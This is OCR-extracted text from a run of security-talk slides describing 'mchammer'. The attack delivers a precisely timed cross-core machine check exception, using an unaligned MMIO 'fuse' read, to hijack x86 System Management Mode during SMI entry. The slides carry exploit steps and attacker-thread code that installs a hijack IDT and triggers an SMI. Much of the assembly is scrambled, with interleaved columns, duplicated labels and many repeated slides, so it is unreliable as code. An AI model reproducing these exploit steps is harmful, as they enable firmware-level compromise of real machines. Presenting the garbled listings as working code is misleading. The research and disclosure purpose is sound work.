bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 126

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…):…):): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

BITS 32 mov  al, strict byte 1 @ProtectedMode: ASM_PFX(gPatchXdSupported): mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd o16 mov  es, ax o16 mov  fs, ax mov  al, strict byte 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…):…):): o16 mov  ss, ax cmp  al, 1 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported ASM_PFX(gPatchSmiStack): jmp  ProtFlatMode

## Slide 127

BITS 16 BITS 64 sub  esp, 4 @LongMode: ASM_PFX(gcSmiHandlerTemplate): ProtFlatMode: xor  rdx, rdx mov  rax, strict qword 0 _SmiEntryPoint: mov  eax, strict dword 0 push rdx SmiHandlerIdtrAbsAddr: mov  bx, _GdtDesc-_SmiEntryPoint+0x8000 ASM_PFX(gPatchSmiCr3): jmp  EnableNxe lidt [rax] mov  ax,[cs:DSC_OFFSET+DSC_GDTSIZ] mov  cr3, rax lea  ebx, [rdi+DSC_OFFSET] dec  ax mov  eax, 0x668 MsrIa32MiscEnableSupported: mov  ax, [rbx+DSC_DS] mov  [cs:bx], ax mov  ecx, MSR_IA32_MISC_ENABLE mov  ds, eax mov  eax, [cs:DSC_OFFSET+DSC_GDTPTR] mov  cl, strict byte 0 rdmsr mov  ax, [rbx+DSC_OTHERSEG] mov  [cs:bx+2], eax ASM_PFX(gPatch5LevelPagingNeeded): sub  esp, 4 mov  es, eax o32 lgdt  [cs:bx] cmp  cl, 0 push rdx mov  fs, eax mov  ax, PROTECT_MODE_CS je   SkipEnable5LevelPaging test edx, BIT2 mov  gs, eax mov  [cs:bx-0x2],ax jz   EnableNxe mov  ax, [rbx+DSC_SS] mov  edi, strict dword 0 bts  eax, 12 and  dx, 0xFFFB mov  ss, eax ASM_PFX(gPatchSmbase): SkipEnable5LevelPaging: wrmsr lea  eax, [edi+(@ProtectedModeEnableNxe: mov  rbx, [rsp+0x8] _SmiEntryPoint)+0x8000] mov  cr4, rax mov  ecx, MSR_EFER mov  [cs:bx-0x6],eax rdmsr ... mov  ebx, cr0 sub  esp, 8 or   ax, MSR_EFER_XD and  ebx, 0x9ffafff3 sgdt [rsp] wrmsr mov  rcx, rbx or   ebx, 0x23 mov  eax, [rsp + 2] jmp  @XdDone mov  rax, strict qword 0 mov  cr0, ebx add  esp, 8 @SkipXd: SmiRendezvousAbsAddr: jmp  dword 0x0:0x0 mov  dl, 0x89 sub  esp, 8 call rax _GdtDesc: mov  [rax+TSS_SEGMENT+5], dl @XdDone: DW 0 mov  eax, TSS_SEGMENT ... DD 0 ltr  ax push LONG_MODE_CS call Base rsm BITS 32 mov  al, strict byte 1 Base: @ProtectedMode: ASM_PFX(gPatchXdSupported): add  dword [rsp], @LongMode-Base mov  ax, PROTECT_MODE_DS cmp  al, 0 o16 mov  ds, ax jz   @SkipXd mov  ecx, MSR_EFER o16 mov  es, ax rdmsr o16 mov  fs, ax mov  al, strict byte 1 or   ah, 1 o16 mov  gs, ax ASM_PFX(gPatchMsrIa32MiscEnable…): wrmsr o16 mov  ss, ax cmp  al, 1 mov  rbx, cr0 mov  esp, strict dword 0 jz   MsrIa32MiscEnableSupported or   ebx, 0x80010023 ASM_PFX(gPatchSmiStack): mov  cr0, rbx jmp  ProtFlatMode retf

## Slide 128

⊷Attack window 0:

⊸ Any interrupt/exception other than MCE ⊸ Before “lidt”

⊷Attack window 1:

⊸ MCEs

⊸ Between “mov CR4” and “lidt”

the attack windows

## Slide 129

⊷MCE attack:

⊸ Create MCE from attacking thread outside SMM ⊸ Receive MCE on victim thread in SMM attack window

# the attack windows

## Slide 130

- ⊷SMM design has all threads enter/exit SMM simultaneously

   - ⊸ Thread triggers SMI through some hardware event

   - ⊸ SMI signal sent to all threads on platform

   - ⊸ Each thread finishes its current instruction, then enters SMM

   - ⊸ Thread “quiescing" ensures all threads executing within SMM at same time

- ⊷Prevents non-SMM thread from attacking SMM thread

- ⊷Common pattern in privileged execution modes

thread quiescing

## Slide 131

⊷Challenge:

- ⊸ Victim thread must be in SMM

- ⊸ While attacking thread is outside SMM

- ⊸ But all threads enter SMM at the same time

⊷Observation:

- ⊸ Threads do not technically enter SMM at the same time ⊸ Each thread gets to finish its current instruction

⊸ Attacking thread has one instruction with which to complete the attack

thread quiescing

## Slide 132

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction . out b2 (trigger SMI) receive SMI receive SMI . out b2 ends . enter SMM (idt unchanged, cr4.mce cleared) . begin executing SMI handler What if… . … . set cr4.mce . … ??? triggers MCE … . receive MCE ??? instruction ends … enter SMM … begin executing SMI handler reload IDT

## Slide 133

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction out b2 (trigger SMI) receive SMI out b2 ends 10,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler What we need… … set cr4.mce … … 100 cycles receive MCE Attack window … … reload IDT

## Slide 134

## What we have…

Thread 1 (attacker) Thread 0 (victim) begin ??? instruction out b2 (trigger SMI) 700 cycles receive SMI receive MCE enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce

- … … receive MCE Attack window … … reload IDT

## Slide 135

- ⊷Does a ??? instruction exist?

   - ⊸ Must generate MCE after 10,000+ cycles

   - ⊸ Must be precise enough for 100 cycle attack window

## Slide 136

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse…


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| et’s build ahammer...
| et's add a handle...
| et’s be a bit more careful...
| et’s find a nail...
| et’s light a fuse...
```

## Slide 137

### ⊷Challenge

- ⊸ Need instruction that generates master abort

- ⊸ Master abort done through MMIO on PCI space

- ⊸ Architecture requires “movl %(mem), %eax” instruction for MMIO

- ⊸ ~6 cycles (hitting cache)

- ⊸ ~250 cycles (hitting RAM)

- ⊸ ~700 cycles (hitting PCI MMIO)

building a fuse

## Slide 138

- ⊷MMIO reads are an order of magnitude away from the latency needed for the fuse instruction.

- ⊷The attack won’t work.

building a fuse

## Slide 139

(demo)

building a fuse

## Slide 140


> Recovered by OCR — confidence 90/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
fed40000 -
fed40800 -
- 6200
fed41000 -
fed41800 -
- 6150
fed42000 -
fed42800 - Ler
fed43000 -
- 6050
fed43800 -
```

## Slide 141

- ⊷Not all MMIO reads are created equal

   - ⊸ Normal devices on PCIe bus: ~700 cycles

   - ⊸ Slowest devices on PCIe bus: ~4000 cycles

- ⊷ Can we increase this?

   - ⊸ Add competing MMIO traffic: +2000 cycles

   - ⊸ Low power states and underclocking: +1400 cycles

   - ⊸ Complex physical PCI topology: +1000 cycles

- ⊷Still not enough, and attack is increasingly impractical

building a fuse

## Slide 142

⊷ “MMIO Configuration Coding Requirements”

“

Instructions used to read MMIO configuration space are required to take the following form:

mov eax/ax/al, any_address_mode;

No other source/target registers may be used other than eax/ax/al.

”

building a fuse

## Slide 143

||||m|ovl (0xf80|13c00),|%eax|||||||
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|||||eax|||||||||
|a1|82|9f|1c
13|92
5e|e7
98|56|9f|af|b3|67|8b|f1|
|f8013bf0|||f8013c00||f8013c04||||f8013c08||||
||||a|ccess time:|~4000c|ycles|||||||

# building a fuse

## Slide 144

||||m|ovq (0xf8013c00)|, %rax|||||||
|---|---|---|---|---|---|---|---|---|---|---|---|
|||||rax||||||||
|a1|82|9f|1c
13|92
5e
e7
98|56|9f|af|b3|67|8b|f1|
|f8013bf0|||f8013c00|f8013c04||||f8013c08||||
||||a|ccess time: ~8000c|ycles|||||||

building a fuse

## Slide 145

⊷ “MMIO Configuration Coding Requirements”

“

In addition, all such accesses are required not to cross any naturally aligned DW boundary.

Access to MMIO configuration space registers that do not meet these requirements result in undefined behavior.

”

building a fuse

## Slide 146

movq (0xf8013c00), %rax rax a1 82 9f 1c 13 92 5e e7 98 56 9f af b3 67 8b f1

building a fuse

## Slide 147

movq (0xf8013c01), %rax

rax

|a1|82|9f|1c
13|92
5e
e7
98|56
9f|af|b3|67|8b|f1|
|---|---|---|---|---|---|---|---|---|---|---|
|f8013bf0|||f8013c00|f8013c04|||f8013c08||||
||||a|ccess time: ~12,000|cycles||||||

# building a fuse

## Slide 148

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax

rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 149

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 150

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 151

⊷Find high access time on existing PCIe device… … followed by non-existing device ⊸ Need non-existing device to generate master-abort and trigger MCE movq (0xf8013ff9), %rax

rax

a1 82 9f 1c 13 92 5e e7 98 56 9f af X X X X

# building a fuse

## Slide 152

- ⊷The fuse instruction

   - ⊸ An unaligned 8-byte PCIe access

   - ⊸ Straddles slow PCIe device and non-existing device

   - ⊸ CPU performs 3 separate 4 byte MMIO access

   - ⊸ Final 4-byte MMIO access hits non-existing PCIe device

   - ⊸ No device claims PCI request, results in PCI master-abort

   - ⊸ PCI master-abort received by northbridge

   - ⊸ Northbridge sends error to CPU

   - ⊸ CPU generates machine check exception

   - ⊸ 10,000+ cycles after fuse instruction began

# lighting the fuse

## Slide 153

⊷Little control over how long the fuse instruction takes

- ⊷But MCE must arrive in precise window

# lighting the fuse

## Slide 154

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction

⊷What we wanted…

out b2 (trigger SMI) receive SMI out b2 ends ~10,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce generate MCE … Attack window receive MCE … reload IDT

## Slide 155

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction out b2 (trigger SMI) receive SMI out b2 ends ~12,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … ⊷What we have… Attack window … … reload IDT generate MCE receive MCE

## Slide 156

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction

⊷What if we…

out b2 (trigger SMI) receive SMI out b2 ends ~12,000 cycles enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … Attack window … … reload IDT generate MCE receive MCE

~12,000 cycles

## Slide 157

Thread 1 (attacker) Thread 0 (victim)

begin fuse instruction

out b2 (trigger SMI) ~12,000 cycles receive SMI out b2 ends enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … Attack window … … generate MCE reload IDT receive MCE

~12,000 cycles ⊷What if we…

## Slide 158

Thread 1 (attacker) Thread 0 (victim)

⊷What if we…

begin fuse instruction ~12,000 cycles out b2 (trigger SMI) receive SMI out b2 ends enter SMM (idt unchanged, cr4.mce cleared) begin executing SMI handler … set cr4.mce … generate MCE … Attack window receive MCE reload IDT

## Slide 159

⊷With this, can deliver cross-core MCEs to victim threads during privilege transitions, at precise target times

# lighting the fuse

## Slide 160

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces.

## Slide 161

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces. We need a name…

## Slide 162

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail… Let’s light a fuse… We have all the pieces. We need a name…

mchammer

## Slide 163

the exploit.

## Slide 164

I/O
Device

North CPU Bridge PCIe device

RAM

MMIO RAM

## Slide 165

mov si,0x8148
o32 lgdt [cs:si]
mov eax,0x3
mov cr0,eax
jmp short 0x14
...
mov eax, 0x668
mov cl, 0
I/O  RAM
cmp cl, 0
Device je 3f
bts eax, 12
mov cr4, rax
sub esp, 8
sgdt [rsp]
mov eax, [rsp + 2]
add esp, 8
mov dl, 0x89
...
North
CPU mov rbx, cr0 SMRAM
Bridge or ebx, 0x80010023
mov cr0, rbx
retf
mov rax, 0
MMIO
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
mov ax, [rbx+DSC_DS]
mov ds, eax
PCIe
mov ax, [rbx+DSC_OT]
mov es, eax
device
...
mov rcx, rbx
mov rax, SmiRendezvous RAM
call rax
add   rsp, 0x20
fxrstor64 [rsp]
...
rsm

## Slide 166

I/O
Device

North CPU Bridge PCIe device

RAM
SMRAM
MMIO
RAM

## Slide 167

I/O
Device
North
CPU
Bridge
PCIe
device

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
MMIO
RAM
OS IDT

## Slide 168

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
OS IDT

## Slide 169

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge
MMIO
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax RAM
OS IDT

## Slide 170

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 171

thread 0 (victim) movq $0x92, %%rcx I/O loop . Device outb %%al, $0xb2 nop North CPU Bridge thread 1 (attacker) PCIe (reconfigure northbridge) device (install hijack IDT) movq (0xf8013ff9), %rax

… ffffffffc0b2ed80 ffffffffc0b2edc0 ffffffffc0b2ee40 … RAM push %%rax push %%rdi push %%rsi call os_mce_handler pop %%rsi pop %%rdi pop %%rax iretq SMRAM … MMIO ffffffffc0197da0 … push %%rax push %%rdi push %%rsi RAM call smm_mce_handlersmm_mce_handler

push %%rax push %%rdi push %%rsi call smm_mce_handlersmm_mce_handler pop %%rsi pop %%rdi pop %%rax iretq

## Slide 172

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 173

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 174

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 175

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 176

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 177

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 178

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 179

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 180

thread 0 (victim)
movq $0x92, %%rcx
I/O
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
…
MMIO ffffffffc0197da0
…
push %%rax
push %%rdi
push %%rsi
RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 181

thread 0 (victim)
movq $0x92, %%rcx
I/O
loop .
Device
outb %%al, $0xb2
nop
North
CPU
Bridge
thread 1 (attacker)
PCIe
(reconfigure northbridge)
device
(install hijack IDT)
movq (0xf8013ff9), %rax

…
ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
…
RAM
push %%rax
push %%rdi
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
SMRAM
…
MMIO ffffffffc0197da0
…
push %%rax
push %%rdi
push %%rsi
RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
Hijack IDT

## Slide 182

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT

## Slide 183

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 184

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 185

…
ffffffffc0b2ed80
ffffffffc0b2edc0
thread 0 (victim)
ffffffffc0b2ee40
movq $0x92, %%rcx …
I/O  RAM
loop .
Device push %%rax
outb %%al, $0xb2
push %%rdi
nop
push %%rsi
call os_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
North
CPU SMRAM
Bridge …
MMIO ffffffffc0197da0
thread 1 (attacker)
…
PCIe
(reconfigure northbridge)
device (install hijack IDT) push %%rax
push %%rdi
push %%rsi
movq (0xf8013ff9), %rax RAM call smm_mce_handler
pop %%rsi
pop %%rdi
pop %%rax
iretq
OS IDT
SMI#
Hijack IDT
SMI#

## Slide 186

mov si,0x8148
o32 lgdt [cs:si] …
mov eax,0x3 ffffffffc0b2ed80
mov cr0,eax
jmp short 0x14 ffffffffc0b2edc0
thread 0 (victim) ... ffffffffc0b2ee40
mov eax, 0x668
mov cl, 0
movq $0x92, %%rcx …
I/O  RAM
cmp cl, 0
loop .
je 3f
Device push %%rax
outb %%al, $0xb2 bts eax, 12
push %%rdi
nop mov cr4, rax
push %%rsi
sub esp, 8 call os_mce_handler
sgdt [rsp]
pop %%rsi
mov eax, [rsp + 2]
pop %%rdi
add esp, 8
pop %%rax
mov dl, 0x89
iretq
...
North
CPU mov rbx, cr0
Bridge or ebx, 0x80010023 …
mov cr0, rbx
retf
mov rax, 0
MMIO ffffffffc0197da0
lidt [rax]
lea ebx, [rdi+DSC_OFFS]
thread 1 (attacker)  mov ax, [rbx+DSC_DS]
mov ds, eax …
PCIe
(reconfigure northbridge) mov ax, [rbx+DSC_OT]
mov es, eax
device (install hijack IDT) ... push %%raxpush %%rdi
mov rcx, rbx
push %%rsi
